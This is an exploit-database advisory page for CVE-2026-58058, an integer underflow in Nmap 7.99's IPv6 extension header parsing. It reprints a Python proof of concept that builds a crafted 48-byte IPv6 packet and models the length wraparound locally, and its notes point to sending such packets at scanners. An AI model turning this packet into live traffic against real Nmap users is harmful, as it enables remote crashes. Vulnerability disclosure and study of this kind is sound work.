---
title: Nmap  7.99  Extension Header Integer Underflow
url: https://cxsecurity.com/issue/WLB-2026100003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-10-20
fetch_date: 2026-10-21T06:46:59.049878
---

# Nmap  7.99  Extension Header Integer Underflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Nmap 7.99 Extension Header Integer Underflow** **2026.10.20**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-58058](https://cxsecurity.com/cveshow/CVE-2026-58058/ "Click to see CVE-2026-58058")**  CWE: **N/A** | |

# Exploit Title: Nmap 7.99 - Extension Header Integer Underflow
# CVE: CVE-2026-58058
# Date: 2026-06-29
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://nmap.org
# Software Link: https://nmap.org/download
# Affected: Nmap <= 7.99
# Tested on: Nmap 7.99 (raw IPv6 scans)
# Category: Remote Denial of Service
# Platform: Linux / Windows / macOS
# Exploit Type: Proof of Concept
# CVSS: 6.9
# Description: Triggers integer underflow in IPv6 extension header parsing (ipv6\_get\_data\_primitive) leading to OOB reads and crash.
# Fixed in: Nmap commit bb6754e (post-7.99)
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# --
#
# Notes:
# • This is a standalone parser + packet model PoC.
# • For real triggering, craft and send IPv6 packets toward an Nmap scanner.
#
# How to Use
#
# Step 1:
# Save as exploit.py and run with Python 3.
#
# Step 2:
# Observe the length wraparound that would cause Nmap to misbehave.
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ███████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
def is\_extension(hdr):
return hdr in [0, 43, 44, 60]
def is\_upper(hdr):
return hdr in [6, 17, 58, 132]
def parse\_ipv6\_payload(packet, upper\_only=True):
if len(packet) < 40:
return None, None, None
nxt = packet[6]
p = 40
end = len(packet)
while p < end and is\_extension(nxt):
if p + 2 > end:
return None, None, None
nxt = packet[p]
ext\_len = packet[p + 1]
p += (ext\_len + 1) \* 8
payload\_len = end - p
if upper\_only and not is\_upper(nxt):
return None, None, None
return p, nxt, payload\_len
def main():
banner()
# Crafted packet (48 bytes)
packet = bytearray(48)
packet[0] = 0x60
packet[4] = 0x00
packet[5] = 0x08 # IPv6 payload length = 8
packet[6] = 0 # Next Header = Hop-by-Hop
packet[40] = 17 # Extension next = UDP
packet[41] = 1 # Extension length field = 1
captured\_len = len(packet)
payload\_offset, next\_header, payload\_len = parse\_ipv6\_payload(packet)
print("helper\_returned =", "true" if payload\_offset is not None else "false")
print("next\_header =", next\_header)
print("payload\_offset =", payload\_offset)
print("wrapped\_payload\_len =", payload\_len)
# Downstream length adjustment model
ip\_payload\_len = (packet[4] << 8) | packet[5]
validator\_len = captured\_len
if payload\_len > ip\_payload\_len:
validator\_len -= payload\_len - ip\_payload\_len
print("validator\_len\_after\_adjust =", validator\_len)
print("captured\_len =", captured\_len)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026100003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top